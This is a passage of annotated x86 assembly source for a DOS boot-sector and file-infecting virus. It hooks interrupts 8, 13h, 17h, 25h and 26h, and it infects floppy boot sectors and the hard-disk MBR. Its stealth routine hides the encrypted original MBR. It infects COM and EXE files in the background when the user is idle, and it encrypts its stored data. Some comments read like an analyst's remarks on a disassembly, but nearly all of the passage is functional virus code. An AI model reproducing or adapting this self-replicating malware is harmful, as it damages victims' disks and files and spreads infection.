   int25:
           mov     cs:inout_flag,1
           call    dword ptr cs:ofs_i25
           mov     cs:inout_flag,0
           retf

   int26:
           mov     cs:inout_flag,1
           call    dword ptr cs:ofs_i26
           mov     cs:inout_flag,0
           retf

   mark_activity:
           mov     cs:inout_flag,0
           mov     cs:tick_value,8*18      ; 8 seconds
           mov     cs:tick_counter,0
           ret

   int17:
           mov     cs:inout_flag,1
           pushf
           call    dword ptr cs:ofs_i17
           call    mark_activity
           iret

   check_boot_inf:
           push    cs
           pop     es
           push    cs
           pop     ds
           mov     si,3Eh
           add     si,bx
           mov     cx,offset(c_floppy)-offset(floppy_code)
           mov     di,offset(floppy_code)
           cld
           rep     cmpsb
           ret

   install_from_boot:
           mov     al,13h
           call    get_int_vector          ; Get int 13h vector
           mov     [bp+ofs_i13],bx         ; Store it
           mov     [bp+seg_i13],es
           mov     [bp+use_ports],0
           call    check4ide
           cmp     al,66h                  ; Can use ports?
           jne     no_use_ports            ; No? then jmp
           mov     [bp+use_ports],1
   no_use_ports:
           call    install_virus
           ret

   patch_i13:
           push    si
           push    di
           push    es
           push    ds
           push    cs
           pop     es
           lds     si,dword ptr es:ofs_i13
           push    si
           mov     di,offset(i13_5bytes)
           cld
           movsw           ; Save five bytes
           movsw
           movsb
           pop     si
           cli
           mov     byte ptr [si],0EAh     ; Insert a jmp far to cs:int_13
           mov     word ptr [si+1],offset(int_13)
           mov     [si+3],es
           sti
           pop     ds
           pop     es
           pop     di
           pop     si
           ret

   int_13:
           mov     cs:inout_flag,1
           call    enable_FD
           push    si
           push    di
           push    es
           push    ds
           mov     si,offset(i13_5bytes)
           push    cs
           pop     ds
           les     di,dword ptr cs:ofs_i13
           cld
           movsw           ; Restore original 5 bytes of int 13h
           movsw
           movsb
           pop     ds
           pop     es
           pop     di
           pop     si
           cmp     dx,80h          ; 1st HD?
           jne     not_stealth     ; No? then jmp
           cmp     cx,1            ; Track 0, sector 1?
           jne     not_stealth     ; No? then jmp
           cmp     ah,2            ; Read sector?
           je      stealth_mbr_read ; Yes? then jmp
           cmp     ah,3            ; Write sector?
           je      stealth_mbr_write ; Yes? then jmp
   not_stealth:
           test    dl,80h          ; Is a HD?
           jnz     call_i13        ; Yes? then jmp
           jmp     is_a_floppy

   call_i13:
           pushf
           call    dword ptr cs:ofs_i13_2
   exit_i13:
           mov     cs:inout_flag,0
           call    disable_FD
           call    patch_i13       ; Patch int 13h again
           retf    2

   stealth_mbr_read:
           push    ax
           push    bx
           push    cx
           push    dx
           push    es
           push    ax
           push    es
           push    bx
           mov     ah,8
           int     13h     ; Get current drive parameters
           inc     ch      ; Inc cylinder
           dec     cl      ; Dec sector
           pop     bx
           pop     es
           pop     ax
           pushf
           mov     dl,80h
           mov     ah,2
           int     13h     ; Read original MBR (encrypted)
           mov     cx,512
           mov     al,cs:mask_orig_mbr
   dec_mbr_rd:
           xor     es:[bx],al      ; Decrypt the original MBR
           inc     bx
           loop    dec_mbr_rd
   exit_mbr_stealth:
           popf
           pop     es
           pop     dx
           pop     cx
           pop     bx
           pop     ax
           call    patch_i13
           retf    2

   stealth_mbr_write:
           push    ax
           push    bx
           push    cx
           push    dx
           push    es
           push    es
           push    bx
           push    ax
           mov     cx,512
           mov     al,cs:mask_orig_mbr
   enc_mbr_wr:
           xor     es:[bx],al      ; Encrypt the new MBR
           inc     bx
           loop    enc_mbr_wr
           pop     ax
           pop     bx
           pop     es
           push    ax
           push    es
           push    bx
           mov     ah,8
           int     13h     ; Get current drive parameters
           inc     ch      ; Inc max. cylinder
           dec     cl      ; Dec max. sector
           pop     bx
           pop     es
           pop     ax
           mov     dl,80h
           mov     ah,3
           call    int13h  ; Write new original MBR (encripted)
           pushf
           mov     cx,512
           mov     al,cs:mask_orig_mbr
   dec_mbr_wr:
           xor     es:[bx],al      ; Decrypt MBR
           inc     bx
           loop    dec_mbr_wr
           jmp     exit_mbr_stealth

   is_a_floppy:
           pushf
           call    push_registers
           cmp     ah,2            ; Read sector?
           je      read_write      ; Yes? then jmp
           cmp     ah,3            ; Write sector?
           je      read_write      ; Yes? then jmp
           jmp     infect_boot

   read_write:
           or      dh,dh           ; Track 0?
           jnz     infect_boot     ; No? then jmp
           cmp     cx,1            ; Sector 1, track 0? trying boot?
           jnz     infect_boot     ; No? then jmp
           push    cx
           push    dx
           push    ax
           push    es
           push    bx
           push    ax
           push    cs
           pop     es
           mov     si,3
   read_boot_again:
           mov     ax,0201h
           mov     cx,1
           mov     dh,ch
           mov     bx,offset(sector)
           call    int13h                  ; Read boot
           dec     si
           jz      infect_boot_pops        ; 3 errors reading? then jmp
           jc      read_boot_again         ; error? then jmp
           call    check_boot_inf          ; Infected?
           jne     infect_boot_pops        ; No? then jmp
           add     bx,offset(vir_track)-offset(floppy_code)+3Eh
           nop                     ; !?
           mov     ch,[bx]         ; Virus track
           pop     ax
           pop     bx
           pop     es
           mov     al,1
           mov     cl,0Dh
           call    int13h          ; Read/write original boot
           pop     ax
           dec     al
           pop     dx
           pop     cx
           inc     cl
           call    int13h          ; And the rest of sectors
           or      cs:flags,10h    ; Don't need to call int 13h
           jmp     infect_boot

   infect_boot_pops:
           pop     ax
           pop     bx
           pop     es
           pop     ax
           pop     dx
           pop     cx
   infect_boot:
           xor     ax,ax
           mov     ds,ax           ; DS:=0
           cmp     dl,3            ; diskette?
           jbe     test_motor      ; Yes? then jmp
           jmp     error_inf_boot

   test_motor:
           mov     cl,dl
           mov     al,1
           shl     al,cl           ; Set bit of drive
           mov     cs:bit_drive,al
           test    ds:[43Fh],al    ; Diskette motor on?
           jnz     error_inf_boot  ; Yes? then jmp
           push    cs
           pop     ds
           push    ds
           pop     es
           mov     si,3
           mov     drive,dl
   read_boot:
           xor     ax,ax
           call    int13h          ; Reset drive controller
           mov     ax,0201h
           mov     cx,1
           mov     dh,ch
           mov     bx,offset(sector)
           call    int13h          ; Read sector
           jnc     boot_loaded
           dec     si
           jz      error_inf_boot
           jmp     read_boot

   boot_loaded:
           call    check_boot_inf          ; Already infected?
           jcxz    error_inf_boot          ; Yes? then jmp
           call    format_extra_track      ; And write code to disk
           jc      error_inf_boot
           push    cs
           pop     ds
           mov     vir_track,ch            ; Store new track
           mov     word ptr jmp_bootcode,3CEBh   ; Encode jmp floppy_code
           mov     byte ptr jmp_bootcode+2,90h
           mov     si,offset(floppy_code)
           mov     di,offset(sector)+3eh
           push    ds
           pop     es
           mov     cx,end_floppy_code-floppy_code
           cld
           rep     movsb
           mov     ax,301h
           mov     bx,offset(sector)
           xor     dh,dh
           mov     cx,1
           call    int13h          ; Write new boot sector
   error_inf_boot:
           call    pop_registers
           popf
           test    cs:flags,10h    ; Need to call int 13h?
           jnz     no_call_i13     ; No? then jmp
           jmp     call_i13

   no_call_i13:
           clc
           mov     cs:flags,0      ; Clear all flags
           jmp     exit_i13

   format_extra_track:
           mov     al,1Eh
           call    get_int_vector          ; Dir of diskette parameters
           cli
           mov     word ptr es:[bx+3],0D02h        ; 2-> 512 bytes/sector
                               ; 0Dh-> last sector
           sti
           mov     ax,totsecs
           or      ax,ax           ; Total sectors=0?
           jz      error_ft        ; Yes? then jmp
           mov     bx,trksecs      ; Sectors per track
           xor     bh,bh
           cmp     ax,bx           ; Total sectors<=Sectors per track?
           jle     error_ft        ; Yes? then jmp
           div     bl              ; Calculate number of tracks
           mov     bx,headcnt      ; Number of heads
           xor     bh,bh
           cmp     ax,bx           ; Number of tracks<=Number of heads?
           jle     error_ft        ; Yes? then jmp
           div     bl              ; Tracks per head
           mov     ah,1
           mov     cx,0Dh          ; 13 sectors
           mov     di,offset(format_table)
           push    di
           push    cs
           pop     es
   make_table_sectors:
           mov     es:[di],al              ; Track
           mov     byte ptr es:[di+1],0    ; Head 0
           mov     es:[di+2],ah            ; Sector Number
           mov     byte ptr es:[di+3],2    ; Size (2-> 512)
           inc     ah                      ; Next sector
           add     di,4                    ; Next table entry
           loop    make_table_sectors
           mov     dl,cs:drive
           mov     ah,5
           pop     bx
           mov     ch,al
           mov     cl,1
           xor     dh,dh
           call    int13h          ; Format extra track
           jc      error_ft
           mov     ax,301h
           mov     bx,offset(sector)
           mov     cl,0Dh
           call    int13h          ; Store original boot
           jc      error_ft
           mov     ax,30Ch
           xor     bx,bx
           mov     cl,1
           call    int13h          ; Write code to disk
           ret
   error_ft:
           stc
           ret

   floppy_code:
           cli
           xor     ax,ax
           mov     ss,ax
           mov     sp,7C00h
           push    cs
           pop     ds
   c_floppy:
           mov     ch,50h          ; Virus track
   vir_track       equ     byte ptr $-1
           xor     dx,dx
           push    cs
           pop     es
           mov     bx,7E00h
           mov     si,3
   read_track:
           mov     ax,20Ch
           mov     cl,1
           int     13h             ; Read code (12 sectors)
           dec     si
           jz      read_exec_boot
           jc      read_track
           mov     bp,bx
           add     bx,offset(install_from_boot)
           push    dx
           push    cx
           call    bx      ; call install_from_boot (infect MBR)
           pop     cx
           pop     dx
   read_exec_boot:
           push    ss
           pop     es
           mov     ax,201h
           mov     bx,7C00h
           mov     cl,0Dh
           pushf                   ; flags
           push    ss              ; 0
           push    bx              ; 7C00h
           jmp     dword ptr es:[13h*4]    ; Read & exec original boot
   end_floppy_code:

   ;---------------------------------------------------------
           jmp     dword ptr cs:ofs_i8     ; ?????
   ;---------------------------------------------------------

   push_registers2:
           pop     cs:return_dir2
           push    ax
           push    bx
           push    cx
           push    dx
           push    es
           push    ds
           push    si
           push    di
           push    bp
           jmp     cs:return_dir2
   pop_registers2:
           pop     cs:return_dir2
           pop     bp
           pop     di
           pop     si
           pop     ds
           pop     es
           pop     dx
           pop     cx
           pop     bx
           pop     ax
           jmp     cs:return_dir2

   int8:
           pushf
           call    dword ptr cs:ofs_i8
           or      cs:ticks_disableFD,0    ; Time to disable FD?
           jz      dis_fd                  ; Yes? then jmp
           dec     cs:ticks_disableFD
   dis_fd:
           cmp     cs:ticks_disableFD,0    ; Time to disable FD?
           jnz     no_permission           ; No? then jmp
           test    cs:flags,2      ; Permission to disable floppy? 1=no
           jz      no_permission   ; BUG!?
           call    disable_FD  ; call with bit1=1 -> doesn't disable FD!!
           and     cs:flags,11111101b
   no_permission:
           call    push_registers2
           xor     ax,ax
           mov     ds,ax
           les     bx,ds:[33h*4]   ; Get mouse int
           push    cs
           pop     ds
           mov     cx,es
           or      cx,cx           ; Int segment=0?
           jz      mark_no_mouse   ; Yes? then jmp
           cmp     byte ptr es:[bx],0CFh   ; Int points to iret?
           je      mark_no_mouse           ; Yes? then jmp
           cmp     mouse_checked,1         ; Did I check the mouse?
           je      serial_mouse            ; Yes? then jmp
           mov     no_mouse,0
           xor     ch,ch
           mov     mouse_checked,1         ; Mark mouse checked
           mov     ax,24h
           int     33h     ; - MS MOUSE - Get soft version and type
           cmp     ch,2            ; Serial mouse?
           je      serial_mouse    ; Yes? then jmp
   mark_no_mouse:
           mov     no_mouse,1      ; No serial mouse
   serial_mouse:
           mov     cx,3
           xor     bx,bx
           xor     bp,bp
   check_com:
           mov     dx,word ptr [bx+com_ports]
           inc     bx
           inc     bx
           or      dx,dx           ; Port installed?
           jz      check_game      ; No? then jmp
                       ; BUG!? We can have COM4 without COM3
           in      al,dx           ; Read byte from port
           call    waste_time
           cmp     al,byte ptr cs:[bp+data_com] ; Actual byte=Previous?
           mov     byte ptr cs:[bp+data_com],al ; Store actual byte
           je      next_port               ; Yes? then jmp
           call    mark_activity
           jmp     check_game
   next_port:
           inc     bp
           loop    check_com       ; Check next COM
   check_game:
           mov     dx,201h
           in      al,dx           ; Game I/O port
           call    waste_time
           cmp     al,data_game    ; Actual byte=Previous byte?
           je      check_keys      ; Yes? then jmp
           call    mark_activity
   check_keys:
           mov     data_game,al    ; Store actual byte
           in      al,60h          ; AT Keyboard controller 8042.
           call    waste_time
           test    al,80h                  ; Key pressed?
           call    pop_registers2
           jnz     inc_tick_counter        ; Yes? then jmp
           call    mark_activity
   inc_tick_counter:
           push    ds
           push    es
           push    bx
           push    cs
           pop     ds
           inc     tick_counter
           cmp     tick_counter,8*18       ; < tick_value secs inactive?
   tick_value      equ     word ptr $-2
           jb      exit_i8                 ; Yes? then jmp
           cmp     into_i21,0              ; int 21h active?
           jnz     exit_i8                 ; Yes? then jmp
           cmp     inout_flag,0            ; Input/output activity?
           jnz     exit_i8                 ; Yes? then jmp
           les     bx,dword ptr ofs_flagdos
           cmp     byte ptr es:[bx],0      ; DOS inactive?
           jnz     exit_i8                 ; Yes? then jmp
           les     bx,dword ptr ofs_swpdos
           cmp     byte ptr es:[bx],0      ; DOS swapping?
           jnz     exit_i8                 ; Yes? then jmp
           mov     tick_counter,0          ; Reset counter
           call    search_files
           or      tick_value,0            ; Tick value=0?
           jz      exit_i8                 ; Yes? then jmp
           cmp     word ptr no_mouse,1  ; Mouse present but not checked?
           jz      exit_i8                 ; No? then jmp
           sub     tick_value,1*18         ; 1 second
   exit_i8:
           pop     bx
           pop     es
           pop     ds
           iret
   search_files:
           call    push_registers2
           mov     ah,2Fh
           call    int21h          ; Get DTA address in ES:BX
           mov     ax,cs
           mov     dx,es
           cmp     ax,dx           ; Virus already using DTA?
           jne     change_dta      ; No? then jmp
           jmp     exit_sf
   change_dta:
           mov     ds:ofs_dta,bx
           mov     ds:seg_dta,es
           mov     ah,1Ah
           mov     dx,offset(dta)
           call    int21h          ; Set DTA
           cmp     fname_waiting,1 ; Has a file waiting to be infected?
           je      infect_via_i8   ; Yes? then jmp
           cmp     searching,1     ; Search in progress?
           je      find_next       ; Yes? then jmp
           mov     ah,4Eh
           mov     cx,3Fh
           test    search_execom,1 ; Searching for COM?
           jnz     search_exe      ; Yes? then jmp
           mov     dx,offset(m_com)
           jmp     find_first

   search_exe:
           mov     dx,offset(m_exe)
   find_first:
           call    int21h          ; Find first file
           jc      change_ftype
           mov     searching,1     ; Mark searching files
           mov     dx,dta_date     ; Get file date
           rcr     dh,1
           cmp     dh,100                  ; Infected?
           jb      convert_relative        ; No? then jmp
   find_next:
           mov     ah,4Fh
           call    int21h          ; Find next
           jc      change_ftype
           mov     dx,dta_date
           rcr     dh,1
           cmp     dh,100          ; Infected?
           jnb     find_next       ; Yes? then jmp
           jmp     convert_relative

   change_ftype:
           dec     search_execom   ; Next type
           mov     searching,0     ; Next time do a find-first
           jmp     restore_dta

   infect_via_i8:
           mov     dx,offset(file_name)
           call    try_to_infect_file
           mov     fname_waiting,0 ; Next time do a search
           jmp     restore_dta

   convert_relative:
           mov     si,offset(dta_fname)
           mov     di,offset(file_name)
           push    cs
           pop     es
           mov     ah,60h
           call    int21h          ; Convert relative path to full path
           mov     fname_waiting,1 ; Next time do an infection
           jmp     restore_dta     ; Very stupid jmp!!!!

   restore_dta:
           mov     ah,1Ah
           mov     ds,cs:seg_dta
           mov     dx,cs:ofs_dta
           call    int21h          ; Restore DTA
   exit_sf:
           call    pop_registers2
           ret

   decrypt_bytes:
           mov     al,code_mask
           cmp     crypt_method,0          ; XOR encryption?
           je      dec_xor                 ; Yes? then jmp
           cmp     crypt_method,1          ; NOT encryption?
           je      dec_not                 ; Yes? then jmp
           cmp     crypt_method,2          ; ROR encryption
           je      dec_rol                 ; Yes? then jmp
           cmp     crypt_method,3          ; DEC encryption?
           je      dec_inc                 ; Yes? then jmp
   dec_xor:
           xor     [si],al
           inc     si
           loop    dec_xor
           ret
   dec_not:
           not     byte ptr [si]
           inc     si
           loop    dec_not
           ret
   dec_rol:
           rol     byte ptr [si],1
           inc     si
           loop    dec_rol
           ret
   dec_inc:
           inc     byte ptr [si]
           inc     si
           loop    dec_inc
           ret


   disinfect_exe:
           push    cs
           pop     ds
           call    read_header
           mov     ofs_virus,length_virus-offset(header)
           call    lseek           ; Lseek to length(file)-1Ch
           mov     ah,3Fh
           mov     cx,1Ch
           mov     dx,offset(header)
           call    int21h          ; Read stored header (encrypted)
           mov     si,dx
           push    si
           call    decrypt_bytes   ; Decrypt header
           mov     ax,4200h
           xor     cx,cx
           xor     dx,dx
           call    int21h          ; Lseek start
           pop     dx
           mov     ah,40h
           mov     cx,1Ch
           call    int21h          ; Write original header
           call    truncate_file   ; and truncate file to original length
           ret

   get_int_vector:                 ; Input: al:=int.number
           push    ds
           push    si
           xor     ah,ah
           mov     si,4
           mul     si
           mov     si,ax
           xor     ax,ax
           mov     ds,ax           ; ds:=0
           les     bx,[si]         ; get int vector in es:bx
           pop     si
           pop     ds
           ret

   m_com           db '*.COM',0
   m_exe           db '*.EXE',0

   header:
   signature       dw      20CDh
   partpag         dw      0
   pagecnt         dw      0
   relocnt         dw      0
   hdrsize         dw      0
   minmem          dw      0
   maxmem          dw      0
   reloss          dw      0
   relosp          dw      0
   chksum          dw      0
   exeip           dw      0
   relocs          dw      0
   tabloff         dw      0
   ovr             dw      0

   length_virus:

   buffer:
   ofs_1c          dw      ?
   seg_1c          dw      ?

   _header:
   _signature      dw      ?
   _partpag        dw      ?
   _pagecnt        dw      ?
   _relocnt        dw      ?
   _hdrsize        dw      ?
   _minmem         dw      ?
   _maxmem         dw      ?
   _reloss         dw      ?
   _relosp         dw      ?
   _chksum         dw      ?
   _exeip          dw      ?
   _relocs         dw      ?
   _tabloff        dw      ?
   _ovr            dw      ?

   stored_psp      dw      ?
   clusters_avail  dw      ?
   stored_drive    db      ?
   loading_dos     db      ?
   xchg1           equ     byte ptr $
   tunnel_ok       equ     byte ptr $
   seg_fname       dw      ?
   xchg2           equ     byte ptr $+1
   ofs_fname       dw      ?
           db      ?,?

   _3bytes         db      ?,?,?
           db      ?
   seg_psp         dw      ?
   ofs_i21         dw      ?
   seg_i21         dw      ?
   ofs_i13         dw      ?
   seg_i13         dw      ?
   flags           db      ?
   ticks_disableFD dw      ?
   ofs_i13_2       dw      ?
   seg_i13_2       dw      ?
   ofs_i24         dw      ?
   seg_i24         dw      ?
   ofs_i1b         dw      ?
   seg_i1b         dw      ?
   ofs_i23         dw      ?
   seg_i23         dw      ?
   ofs_i8          dw      ?
   seg_i8          dw      ?
   ofs_i25         dw      ?
   seg_i25         dw      ?
   ofs_i26         dw      ?
   seg_i26         dw      ?
   ofs_i17         dw      ?
   seg_i17         dw      ?
   length_lo       dw      ?
   length_hi       dw      ?
   f_date          dw      ?
   emul_pushf      equ     word ptr $
   f_time          dw      ?
   attribs         dw      ?
   boot_i21        dw      ?
   filename        equ     word ptr $
   ep_ip           dw      ?       ; Also filename
   ep_cs           dw      ?       ; 8bytes+'.'+3bytes+0
           db      ?
           db      ?
           db      ?
           db      ?
   point           db      ?       ; '.'
   filename_ext    equ     word ptr $      ; 3bytes
   seg_stop        dw      ?
           db      ?
           db      ?
   code_mask       db      ?
   ofs_dta         dw      ?
   seg_dta         dw      ?
   dta:
           db      15h dup(?)
   dta_attr        db      ?
   dta_time        dw      ?
   dta_date        dw      ?
   dta_sizel       dw      ?
   dta_sizeh       dw      ?
   dta_fname       db      0dh dup(?)
   inout_flag      db      ?
   tick_counter    dw      ?
   into_i21        db      ?
   fname_waiting   db      ?
   search_execom   db      ?
   searching       db      ?
   no_mouse        db      ?
   mouse_checked   db      ?
   drive           equ     byte ptr $
   use_ports       db      ?
   bit_drive       db      ?
   data_com:       db      ?       ; COM1
           db      ?       ; COM2
           db      ?       ; COM3
           db      ?       ; COM4
   com_ports:      dw      ?       ; Address of COM1
           dw      ?       ; COM2
           dw      ?       ; COM3
           dw      ?       ; COM4
   data_game       db      ?
   file_name       db      67 dup(?)
   return_dir      dw      ?
   return_dir2     dw      ?
   activity_checks db      ?
   ofs_sft         dw      ?
   ofs_flagdos     dw      ?
   seg_flagdos     dw      ?
   ofs_swpdos      dw      ?
   seg_swpdos      dw      ?
   crypt_method    db      ?
   jmp_virus       db      ?
   ofs_virus       dw      ?
   i13_5bytes      db      5 dup(?)

   end_virdata     equ     word ptr $

   sector:
   jmp_bootcode    db      3 dup(?)
           db      8 dup(?)
   sectsize        dw      ?
   clustsize       db      ?
   ressecs         dw      ?
   fatcnt          db      ?
   rootsize        dw      ?
   totsecs         dw      ?
   media           db      ?
   fatsize         dw      ?
   trksecs         dw      ?
   headcnt         dw      ?
   hidnsec         dw      ?
           db      (512-($-offset(sector))) dup(?)

   format_table    equ     $
   vstack          equ     $-70h
   s_mbr           equ     $-70h+1
   buffer_enc      equ     $+34h

   org    $+34h
           db      512 dup(?)
   vir_end         equ     $

   v6000           ends
           end    start
